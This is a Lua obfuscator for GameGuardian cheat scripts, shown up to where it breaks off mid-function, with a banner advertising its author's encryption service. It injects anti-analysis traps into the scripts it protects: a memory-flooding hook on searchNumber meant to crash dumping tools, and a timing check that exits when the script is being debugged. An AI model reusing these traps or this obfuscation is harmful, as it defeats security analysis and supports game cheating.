if not vpn  or not vpn:sub(1,20) then 
    gg["alert"]("请允许访问网络！",string.char())
else
    while #vpn<100 or vpn:find("SSL") or vpn:find("I/O") or vpn:find("javax") do
    end
end
rzlog=tonumber("1024")
Rep={}
for i=1,rzlog do
    Rep[i]=" "
end
logFk=(table.concat(Rep))
for i=1,rzlog do
    Rep[i]=logFk
end
logFk=(table.concat(Rep))
while logFk~=string.rep(" ",rzlog*rzlog) and #logFk~=rzlog^2 do
end
while string.rep("a",5)~="aaaaa" do
end
local Search=gg.searchNumber
gg.searchNumber = function (...)
    local vpn, Rep, time1, time2, rzlog, logFk, logSy, Hour, Montie, Second, search_e, log3, log4, arm
arm={...}
vpn=gg.makeRequest("https://time.tianqi.com/")["headers"]["Date"]
Hour,Montie,Second=vpn[1]:match("(%d+):(%d+):(%d+)")
if Hour=="00" then
    Hour=24
end
time1=Hour*3600+Montie*60+Second
rzlog=tonumber("800")
Rep={}
for i=1,rzlog do
    Rep[i]=" "
end
logFk=(table.concat(Rep))
for i=1,rzlog do
    Rep[i]=logFk
end
logFk=(table.concat(Rep))
while logFk~=string.rep(" ",rzlog^2) and #logFk~=rzlog^2 do
end
while string.rep("a",5)~="aaaaa" do
end
logSy={}
for logTi=1,rzlog do
    logSy[logTi]=logFk
end
logFk=nil
log3={_ENV["gg"]["alert"],_ENV["gg"]["bytes"],_ENV["gg"]["copyText"],_ENV["gg"]["searchAddress"],Search,_ENV["gg"]["toast"]}
for log1, log2 in pairs(log3) do
    xpcall(log2,Search,logSy)
end
log4=string.char(rzlog-rzlog)
search_e=(log4):rep(7)
for i=1,22 do 
    search_e=search_e..search_e 
end
gg.getResults(0)
gg.editAll(search_e,4)
Search(search_e,16,false,gg.SIGN_EQUAL,0,-1)
rzlog, logFk={}, {}
for i=1,50 do
    logFk[i]=math.random(1,2140000000)
    rzlog[logFk[i]]={address=i,flags=4,temp=search_e}
end
rzlog=gg.getValues(rzlog)
vpn=gg.makeRequest("https://time.tianqi.com/")["headers"]["Date"]
Hour,Montie,Second=vpn[1]:match("(%d+):(%d+):(%d+)")
if Hour=="00" then
    Hour=24
end
time2=Hour*3600+Montie*60+Second
while time2-time1>1 do
os.exit()
end
    return Search(table.unpack(arm))
end


]===]
local File_operations = function(path,text)
	if text then
    	io.open(path, "w+"):write(text):close()
    else
        reTn = io.open(path):read("*a")
    	return reTn
    end
end
local Tab={}
function Tab.Table_Rand(t)
	local tRet = {}
	local Total = #t
	while Total > 0 do
		local i = math.random(1,Total)
		table.insert(tRet,t[i])
		t[i] = t[Total]
		Total = Total-1
	end
	return tRet
end--打乱table
local Let={}
Let.Ran_bit = function(num)
    local zl = {}
    if not num then
        num = math.random(3, 5)
    end
    for x = 1, num do
        zl[#zl+1] = "\\x" .. string.char(math.random(65, 70)) .. string.char(math.random(65, 70))
    end
    return table.concat(zl)
end
Let.Ran_str = function(len)
    if not len then
        len = math.random(4, 6)
    end
	local res = ""
	for i = 1, len do
		local choice = math.random(1, 2)
		if choice == 1 then
			res = res .. string.char(math.random(65, 90))
		 elseif choice == 2 then
		    res = res .. string.char(math.random(97, 122))
		end
	end
	return res
end
local Gsrt = function(nr)
    if not Yx_NuTa then
        Yx_NuTa,Yx_Zxc = {}, {}
        local n3 = Let.Ran_str()
        local n2, n4
        for i = 1, 9 do
            n2 = Let.Ran_str()
            nr = nr:gsub(i,n2)
            Yx_Zxc[i] = n2
            Yx_NuTa[i] = "local " .. n2 .. " = " .. "(Char[Tostring(#Fr_Dt)] + " .. i .. ") % "..n3
        end
        Yx_NuTa = table.concat(Yx_NuTa,"\n")
        Yx_NuTa = "local Tostring=tostring\nlocal " .. n3 .. " = Char[Tostring(#Fr_Dt)]\n" .. Yx_NuTa
        n4 = Let.Ran_str()
        nr = nr:gsub("0",n4)
        Yx_Zxc[0] = n4
        Yx_NuTa = Yx_NuTa .. "\nlocal " .. n4 .. " = " .. n3 .." - " .. n3
    else
        for i=0,9 do
            nr = nr:gsub(i, Yx_Zxc[i])
        end
    end
    return nr
end
local NusRv = {}
local cxk = {}
NumCal = function(num)
    local s1, s2, s3, s4, s5, s6, s7, s9, rk, kr
    local t1, t2 = " + "
    t2 = math.random(0,9)
    s1 = num / 256
    s2 = num % 256
    s6 = s1 - t2
    s7 = math.random(1, 7)
    s4 = 0
    repeat
        s4 = s4 + 1
        s3 = 2 ^ s4
        s5 = s2 - s3
    until s5 < 10
    if s5 <= -10 then
        rk = math.random(-9,9)
        s5 = rk - s5
        if not cxk[s5] then
            kr = Let.Ran_bit()
            NusRv[kr] = s5
            cxk[s5] = kr
            trx = cxk[s5]
        else
            trx = cxk[s5]
        end
        s5 = rk
    end
    if s5 < 0 then
        t1 = ""
    end
    if rk then
        s5 = s5 .. " - Wield[\"" .. trx .. "\"]"
        rk = nil
    end
    if s6 >= 10 then
        rk = math.random(-9,9)
        s6 = rk - s6
        if not cxk[s6] then
            kr = Let.Ran_bit()
            NusRv[kr] = s6
            cxk[s6] = kr
            trx = cxk[s6]
        else
            trx = cxk[s6]
        end
        s6 = rk .. " - " .. "Wield[\"" .. trx .. "\"]"
        rk = nil
    end
    s1 = "((" .. tostring(2 ~ s7) .. " ~ " .. s7 .. ") ^ (" .. s4 .. ") ".. t1 .. s5 .. " + (2 ^ (2 ^ 3)) * (" .. s6 .. " + " .. t2 .. "))"
    s1 = Gsrt(s1)
    return s1
end
function WlCon(nr)--while写法
    local func_Name = Let.Ran_str()
    local Key = NumCal(math.random(10000,999999))
    local Main_Key = Key
    for i,k in pairs(nr) do
        if i==#nr then
            nr[i]="if " .. func_Name .. "==" .. Key .. " then\n" .. nr[i] .. "\nbreak\nend\n"
        else
            nr[i]="if " .. func_Name.."==" .. Key .. " then\n" .. nr[i]
            Key = NumCal(math.random(10000,999999))
            nr[i]=nr[i] .. "\n" .. func_Name .. "=" .. Key .. "\nend\n"
        end
    end
    return "local " .. func_Name .."=" .. Main_Key .. "\nwhile true do\n" .. table.concat(Tab.Table_Rand(nr)).."\nend"
end
local fuc = {
    ["gg"] = 2,
    ["os"] = 2,
    ["io"] = 2,
    ["string"] = 2,
    ["math"] = 2,
    ["table"] = 2,
    ["debug"] = 2,
    ["bit32"] = 2,
    ["utf8"] = 2,
}
local Tab2, Be, str_Calcul = {}, {}, {}
local XtyP=0
local Str_Enc = function(Data)
    if Data=="" then
        return "string.char()"
    end
    if str_Calcul[Data] then
        return str_Calcul[Data]
    end
    local max
    while true do
        max = math.random(3000,9000)
        if not Be[max] then
            Be[max]=2
            break
        end
    end
    local compline
    reTn = math.random(10,20)
    local data = {string.byte(Data,0,-1)}
    for i,k in pairs(data) do
        data[i]=k~reTn
    end
    data[#data+1]=reTn
    data = "(function() return Str_dec({"..table.concat(data,",").."}) end)()"
    Tab2[#Tab2+1] = "Sherlock["..max.."]="..data
    str_Calcul[Data] = "string_char(Sherlock["..max.."])"
    return str_Calcul[Data]
end
local Min_num = function(...)
    local arm = {...}
    local num = nil
    for i, v in pairs(arm) do
        if v ~= nil then
            if not num then
                num = v
            elseif num > v then
                num = v
            end
        end
    end
    return num
end
local Fuc_Enc = function(ltre)
    gg.toast("正在加密标准库...")
	for v, s in pairs(_ENV) do
		if type(s) == "table" and fuc[v] then
		    Enc_func1 = Str_Enc(v)
			for i in pairs(s) do
			    if ltre:find(v .. "%." .. i) then
			        Enc_func2 = Str_Enc(i)
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%(", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "](")
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%)", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "])")
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%s*,", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "],")
			    	ltre = ltre:gsub("=(%s*)" .. v .. "%." .. i .. "([^%w_])", "=%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "]%2")
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%s*=", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "]=")
			    end
			end
		elseif type(s) == "function" and debug.getinfo(s)["what"] == "Java" then
		    if ltre:find(v) then
		    	ltre = ltre:gsub("([^%w_])" .. v .. "%(", "%1_ENV[" .. Str_Enc(v) .. "](")
		    	ltre = ltre:gsub("=%s*" .. v .. "([^%w_])", "=_ENV[" .. Str_Enc(v) .. "]%1")
		    end
		end
	end
	return ltre
end
local Enc_Strings = function(DATA,ToStrong_Str)
    local gr = {}
    
    repeat
        local s1, ss1, x1, xx1, n1, n2, str
        s1 = string.find(DATA, "\034")--单引号
        ss1 = string.find(DATA, "\039")--双引号
        x1 = string.find(DATA, "%[[=]*%[")--中括号
        xx1 = string.find(DATA, "%-%-")--注释
        n1 = string.find(DATA, "[^%w_]0[xX][0-9A-Fa-f]+")--Hex
        n2 = string.find(DATA, "[^%w_]%d+")--Number
        
        str = Min_num(s1, ss1, x1, xx1, n1, n2)
        
        if str == nil then
            break
        end
        
        if str == s1 then
            DATA = DATA:gsub("(.-)(\034.-\034)",function(t1, t2)
                gr[#gr + 1] = t1
                t2 = string.gsub(t2, "\\\\","\\092")
                t2 = string.gsub(t2, "\\\034", "\\034")
                
                if t2:sub(-1, -1) ~= "\034" then
                    return t2
                end
                t3 = load("return "..t2)
                
                if not t3 then
                    gg.alert("\034加密失败\n"..t2)
                    os.exit()
                end
                gr[#gr + 1] = ToStrong_Str(t3())
                return ""
            end, 1)
            
        elseif str == ss1 then
            DATA = DATA:gsub("(.-)(\039.-\039)",function(t1, t2)
                gr[#gr + 1] = t1
                t2 = string.gsub(t2, "\\\\","\\092")
                t2 = string.gsub(t2, "\\\039", "\\039")
                
                if t2:sub(-1, -1) ~= "\039" then
                    return t2
                end
                t3 = load("return "..t2)
                
                if not t3 then
                    gg.alert("\039加密失败\n"..t2)
                    os.exit()
                end
                gr[#gr + 1] = ToStrong_Str(t3())
                return ""
            end, 1)
            
        elseif str == x1 then
            local g1 = string.match(DATA,"%[([=]*)%[")
            DATA=DATA:gsub("(.-)(%["..g1.."%[.-%]"..g1.."%])",function(t1, t2)
                gr[#gr + 1] = t1
                t3 = load("return "..t2)
                
                if not t3 then
                gg.alert("[[加密失败\n"..t2)
                os.exit()
            end
                gr[#gr + 1] = ToStrong_Str(t3())
                return ""
            end, 1)
            
        elseif str == xx1 then
            d1, d2, d3, d4 = string.find(DATA, "%-%-(%[([=]*)%[)")
            
            if d1 == xx1 then
                DATA = string.gsub(DATA, "(.-)%-%-%[" .. d4 .. "%[.-%]" .. d4 .. "%]", function(txt1)
                    gr[#gr + 1] = txt1
                    return " "
                end, 1)
            else
                DATA = string.gsub(DATA, "(.-)%-%-[^\n]*", function(txt1)
                    gr[#gr + 1] = txt1
                    return ""
                end, 1)
                
            end
            
        elseif str == n1 then
            DATA = DATA:gsub("(.-[^%w_])(0[xX][0-9A-Fa-f]+)",function(txt1,txt2)
                gr[#gr + 1] = txt1
                gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                return ""
            end,1)
            
        elseif str == n2 then
            local n3, n4, n5, n6
            n3 = string.find(DATA, "[^%w_]%d+%.%d+[eE][%-%+]%d+")
            n4 = string.find(DATA, "[^%w_]%d+%.%d+[eE]%d+")
            n5 = string.find(DATA, "[^%w_]%d+[eE]%d+")
            n6 = string.find(DATA, "[^%w_]%d+%.%d+")
            
            if str == n3 then
                DATA = DATA:gsub("(.-[^%w_])(%d+%.%d+[eE][%-%+]%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            elseif str == n4 then
                DATA = DATA:gsub("(.-[^%w_])(%d+%.%d+[eE]%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            elseif str == n5 then
                DATA = DATA:gsub("(.-[^%w_])(%d+[eE]%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            elseif str == n6 then
                DATA = DATA:gsub("(.-[^%w_])(%d+%.%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
            else
                DATA = DATA:gsub("(.-[^%w_])(%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            end
            
        else
            break
        end
        
    until not str
    gr[#gr+1]=DATA
    gr = table.concat(gr)
    :gsub("return%s+end","return 0\nend")
    return gr
end
local g, yc = {}, {}
g.last = gg.getFile()
g.info = nil
g.config = gg.EXT_FILES_DIR:gsub("%lua$", "") .. "/g.cfgsx"
g.data = loadfile(g.config)
if g.data ~= nil then;
	g.info = g.data()
	g.data = nil
end
if g.info == nil then
	g.info = {g.last}
end
yc.main = gg.prompt({"请选择文件："},g.info,{"file"})
if yc.main == nil then
    os.exit(print("未选择"))
end
gg.saveVariable(yc.main, g.config)
yc.data = Fy.."\n"..File_operations(yc.main[1])
gr = Fuc_Enc(Enc_Strings(yc.data,Str_Enc))

char=[=[
(function()
(function()

end)()
local Xty2=0
local Char={}
for i=0,255 do
    Char[i]=string.char(i)
    Char[string.char(i)]=i
end
local Str_dec = function(_Tab)
    for i=1,(#_Tab-1) do
        _Tab[i]=_Tab[i]~_Tab[#_Tab]
    end
    table.remove(_Tab,#_Tab)
    return _Tab
end
local string_char=function(Tab1)
    for i,k in pairs(Tab1) do
        if type(k)=="number" then
            Tab1[i]=Char[k]
        end
    end
    return table.concat(Tab1)
end
]=]
SX="\000"..[===[   
          🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳
         🇨🇳 凤凤凤凤凤凤凤凤凤凤凤🇨🇳
         🇨🇳 凤凤凤凤凤凤凤凤凤凤凤🇨🇳
         🇨🇳凤凤凤🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳凤凤 🇨🇳
         🇨🇳凤凤🇨🇳          🇨🇳凤凤🇨🇳
         🇨🇳凤凤凤🇨🇳       🇨🇳凤凤 🇨🇳
         🇨🇳凤凤凤凤🇨🇳  🇨🇳凤凤凤凤🇨🇳
         🇨🇳凤凤凤凤🇨🇳🇨🇳凤凤凤凤凤🇨🇳
         🇨🇳凤凤凤凤🇨🇳凤🇨🇳凤凤凤凤🇨🇳
         🇨🇳凤凤凤🇨🇳凤凤凤🇨🇳凤凤凤🇨🇳
         🇨🇳凤凤🇨🇳凤凤凤凤凤🇨🇳凤凤🇨🇳
         🇨🇳凤凤凤凤凤凤凤凤凤凤凤 🇨🇳
         🇨🇳凤凤凤凤凤凤凤凤凤凤凤凤 🇨🇳    🇨🇳
         🇨🇳凤凤凤凤凤凤凤凤凤凤凤凤凤凤🇨🇳  🇨🇳
         🇨🇳凤凤凤凤凤凤凤凤凤凤凤凤凤凤凤🇨🇳🇨🇳
              
栖栖栖栖栖栖🇨🇳栖栖栖栖栖栖🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳              
栖栖栖栖栖栖🇨🇳栖栖栖栖栖栖栖栖🇨🇳栖栖栖🇨🇳栖栖栖               
栖栖栖🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳栖栖栖🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳       
栖栖栖栖栖🇨🇳🇨🇳🇨🇳栖栖栖栖栖🇨🇳栖🇨🇳栖栖栖🇨🇳栖🇨🇳              
栖栖栖栖🇨🇳栖🇨🇳栖栖🇨🇳栖栖栖🇨🇳栖🇨🇳栖栖栖🇨🇳栖🇨🇳                
栖栖🇨🇳栖栖栖🇨🇳栖栖栖🇨🇳栖栖🇨🇳栖🇨🇳栖栖栖🇨🇳栖🇨🇳                  
栖🇨🇳栖栖栖栖🇨🇳栖栖栖栖🇨🇳栖🇨🇳栖🇨🇳栖栖栖🇨🇳栖🇨🇳                   
栖栖栖栖栖栖🇨🇳栖栖栖栖栖栖 🇨🇳栖🇨🇳栖栖栖🇨🇳栖🇨🇳                 
栖栖栖栖栖栖🇨🇳栖栖栖栖栖栖 🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳
      ⚡️[Mt★source★]⚡️
    👻ℍ𝕒𝕡𝕡𝕪 ℍ𝕒𝕝𝕝𝕠𝕨𝕖𝕖𝕟
  今天不想扮鬼 只想扮你的心上人💘
⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓
🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️🈷️
  🔸加密作者：凤栖🔸
  🔸加密版本：4.7🔸
  🔸防御强度:全防🔸
联系作者:2377139010 免费代加
•┈┈┈┈┈┈୨୧┈┈┈┈┈┈•	

    👑         👑
╭◜◝ ͡ ◜◝╮ ╭◜◝ ͡ ◜◝╮
( ๑❛ᴗ❛๑ )    ( ❛ᴗ❛ั⁎ )
╰◟◞ ͜ ◟◞╯ ╰◟◞ ͜ ◟◞╯

    嗨～咱俩是一对云
    加密作者:1937488892    合作者:3328363472
    买加密我我们
🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾  🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾  
🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾  🇲 🇹 🇾   🇲 🇹 🇾  
    🇲 🇹 🇾 🇲 🇹 🇾 
 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇲 🇹 🇾 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
    🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 🇲 🇹 🇾 
--大佬手下留情
]===]
last = yc.main[1]:gsub("(.+)/(.+)",function(x,y)
    CoNe = "[🇲 🇹 🇾 ]·" .. y
    return x .. "/[🇲 🇹 🇾 ]-" .. y
end)

gr=char.."local Sherlock={}\n"..table.concat(Tab2,"\n").."\n".."\n"..gr.."\nend)([===["..SX.."]===])"
local rg=load(gr)
if not rg then
    os.exit(gg.alert("加密失败"))
end

gr=string.dump(rg,true)
gg.internal2(load(gr), last)
gr = io.open(last,"r"):read("*a")
gr = gr:gsub("linedefined [^\n]+", "linedefined 0")
:gsub("lastlinedefined [^\n]+", "lastlinedefined 0")
:gsub("%.maxstacksize %d+", ".maxstacksize 250")
local ZL = {
    ['LOADKX'] = 2,
    ['EXTRAARG'] = 2,
    ['MOVE'] = 2,
    ['UNM'] = 2,
    ['BNOT'] = 2,
    ['NOT'] = 2,
    ['LEN'] = 2,
    ['ADD'] = 2,
    ['SUB'] = 2,
    ['MUL'] = 2,
    ['DIV'] = 2,
    ['IDIV'] = 2,
    ['MOD'] = 2,
    ['POW'] = 2,
    ['BXOR'] = 2,
    ['BOR'] = 2,
    ['BAND'] =2,
    ['SHL'] = 2,
    ['SHR'] = 2,
    ['GETTABLE'] = 2,
    ['SETTABLE'] = 2,
    ['NEWTABLE'] = 2,
    ['SELF'] = 2,
    ['SETLIST'] = 2,
    ['LOADNIL'] = 2,
    ['CONCAT'] = 2,
    ['CALL'] = 2,
    ['VARARG'] = 2,
    ['TAILCALL'] = 2,
    ['TFORCALL'] = 2,
    ['GETUPVAL'] = 2,
    ['SETUPVAL'] = 2,
    ['GETTABUP'] = 2,
    ['SETTABUP'] = 2,
    ['CLOSURE'] = 2,
    ['RETURN'] = 2,
    ['FORLOOP'] = 2,
    ['FORPREP'] = 2,
    ['TFORLOOP'] = 2,
}
function Disloc(Tran,free)
